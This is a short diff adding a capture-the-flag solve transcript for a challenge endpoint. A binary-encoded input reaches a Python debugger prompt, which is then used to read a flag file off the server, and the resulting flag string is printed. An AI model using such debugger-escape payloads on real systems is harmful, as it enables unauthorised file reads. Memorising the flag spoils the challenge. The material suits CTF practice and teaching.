@@ -1,0 +1,11 @@
+CTFxck successful protocol transcript
+Endpoint: chal.thjcc.org:9002
+
+>>> 010001100100111010100110100001101101011000001110111101101001011001110110001011100001010010010100
+.$[2|2]
+EOF
+--Return--
+> <string>(1)<module>()->None
+(Pdb) p open('/hereisasupersecretfile/flag.txt').read()
+'THJCC{h4lt1ng_1s_4_c0ntr0l_fl0w_pr1m1t1v3}\n'
+(Pdb)
